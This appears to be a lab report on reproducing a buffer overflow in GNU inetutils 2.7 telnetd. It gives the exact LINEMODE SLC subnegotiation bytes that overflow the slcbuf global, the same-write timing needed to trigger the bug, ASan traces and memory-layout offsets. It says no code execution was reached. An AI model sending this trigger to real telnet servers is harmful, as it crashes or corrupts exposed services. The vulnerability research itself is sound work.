# inetutils2shell — real telnetd wire evidence (W1, 2026-11-22)

## Scope

A plant-started, loopback-only listener accepts one TCP connection and execs
the pinned telnetd with that socket on fd 0 (inetd-style; this telnetd has no
standalone listener). A raw Python client answers option negotiation and
sends one LINEMODE `LM_SLC` subnegotiation. No external host, credentials,
login success, or kernel exploit is involved. `run_wire.py` is the driver;
`run_all.sh` replays all cases and asserts the observed outcomes.

## Builds (out-of-tree, pinned sources untouched)

```
CFLAGS='-g -O1 -fno-omit-frame-pointer -fsanitize=address' \
LDFLAGS='-fsanitize=address' \
  <pin>/configure --prefix=/tmp/inetutils-*-asan --disable-telnet
make -j4 -C lib; make -j4 -C libtelnet; make -j4 -C libinetutils
make -j4 -C telnetd telnetd
```

Plain 2.7 uses the same configure without sanitizer flags. Binaries:

```
08ed47db2ca55d2469f59d0e5e07495aab351df7ac93803637d7da225d7a7516  build/asan-2.7/telnetd/telnetd
b436cdde3935a419e0dd45a1071b14487dd3b7132a93fa4a51f8e06dd32e7e43  build/asan-2.8/telnetd/telnetd
1adbf6d42a4ecd81157125b2b03815a5f761efe16d0cf3fee11f022cfb72dfc3  src/inetutils-2.7/telnetd/slc.c
1331bbe30fcc0a1393010b619b6da13a07ae34c25a2f981d4ce6de8435c9af7b  src/inetutils-2.8/telnetd/slc.c
```

The source hashes match `PROVENANCE.md`. 2.8 dropped `-D/--debug`: the fixed
control is invoked without `--debug`, all other arguments are identical.

## Wire sequence and exact bytes

Daemon greeting (prefix, from `evidence/norm-vuln-long.summary`):

```
fffd18 fffd20 fffd23 fffd27 fffd24   DO TTYPE/TSPEED/XDISPLOC/NEW_ENVIRON/ENVIRON
fffb03 fffd01 fffd22 fffd1f fffb05 fffd21   WILL SGA, DO ECHO/LINEMODE/NAWS, WILL STATUS, DO LFLOW
fffa220103fff0   IAC SB LINEMODE LM_MODE 3 IAC SE
```

Client replies `WONT` to every option except LINEMODE. On the daemon's
`IAC DO LINEMODE` (`fffd22`) the client writes, in one TCP write:

```
fffb22                          IAC WILL LINEMODE
fffa2203                        IAC SB LINEMODE LM_SLC
  42415a * 50                   (header claims func=0x42 flag=0x41 val=0x5a)
fff0                            IAC SE
```

Sending WILL and the suboption back-to-back is required: `telrcv()` processes
them in wire order, so `willoption()` sets `his_state_will(LINEMODE)` before
`suboption()` reaches the `LM_SLC` branch. An earlier driver that waited for a
separate synchronization marker was flaky because localstat()/pty state can
toggle LINEMODE (`fffe22`, `fffd22`) while the option FSM settles.

**Wire-observed write bytes differ from the direct-call harness.** For a
function octet above `NSLC=18`, `process_slc()` (`slc.c:262-265`) calls
`add_slc(func, SLC_NOSUPPORT, 0)`, so the bytes actually appended to `slcbuf`
are `42 00 00` per triplet. The daemon's own SLC reply in
`norm-fixed-long.summary` confirms this (`...2203420000420000...`). The
frontier's chosen `42415a` three-byte triplet remains a direct-call-scope
result; at wire scope the attacker chooses one octet per three and the other
two are NUL.

## Observed results (five cases)

| case | build | triplets | exit | ASan |
|---|---|---|---|---|
| `vuln-long` | 2.7 ASan | 50 | -6 (abort) | `global-buffer-overflow`, `WRITE of size 1` |
| `fixed-long` | 2.8 ASan | 50 | -15 (we stopped it) | clean |
| `vuln-short` | 2.7 ASan | 5 | -15 (we stopped it) | clean |
| `plain-100` | 2.7 plain | 100 | -11 (SIGSEGV) | n/a |
| `plain-short` | 2.7 plain | 5 | -15 (we stopped it) | n/a |

Vulnerable ASan top frames (normalization strips PID/addresses/BuildId/paths):

```
#FRAME in add_slc      ../../../src/inetutils-2.7/telnetd/slc.c:172
#FRAME in process_slc  ../../../src/inetutils-2.7/telnetd/slc.c:264
#FRAME in do_opt_slc   ../../../src/inetutils-2.7/telnetd/slc.c:494
```

and the first bad store is `0 bytes after global variable 'slcbuf' ... size
108`. Two wire-driven call chains were observed across runs: the direct chain
`telrcv (state.c:438) -> suboption (state.c:1261) -> do_opt_slc` and the
deferred chain `localstat (termstat.c:371) -> defer_terminit (termstat.c:717)
-> deferslc (slc.c:527) -> do_opt_slc`. The committed replay consistently took
the deferred chain; the direct chain was observed in an earlier run of the
same driver before the same-write fix. Both start from the attacker's
subnegotiation bytes.

## Adjacent-global mapping and limits

- ASan build: `slcbuf` at `0x4ec60`, `slcptr` at `0x4ed00` — 160 bytes from
  `slcbuf`, i.e. 52 bytes past its 108-byte end (sanitizer padding).
- Plain build: `slcbuf` at `0x22020`, `slcptr` at `0x22090` — 112 bytes from
  `slcbuf`, i.e. 4 bytes past its end. With 36 or more triplets the writes
  reach `slcptr`; the 100-triplet plain probe segfaults.
- The write pattern at `slcptr` in the plain layout is
  `[func36, 0, 0, func37, 0, 0, func38, 0]`. On little-endian this cannot
  form a canonical userspace pointer (bytes 1,2,4,5,7 stay zero and the
  remaining bytes are function octets). No pointer control, chosen absolute
  write, command execution, or rung 5 was observed or attempted. This is
  consistent with the finder's published doubt about 64-bit exploitability.

## Replay

```
bash lab/frontier/inetutils2shell/wire/run_all.sh
```

17 PASS / 0 FAIL, rc 0 on the committed tree; 3 consecutive replays passed
before the plain-build cases were added and the extended replay passed after.
Normalized hashes (including PID/address/port scrubbing) are in
`WIRE_HASHES.txt`; they were byte-identical across two consecutive extended
replays. Raw traces and normalized artifacts are under `wire/evidence/`.
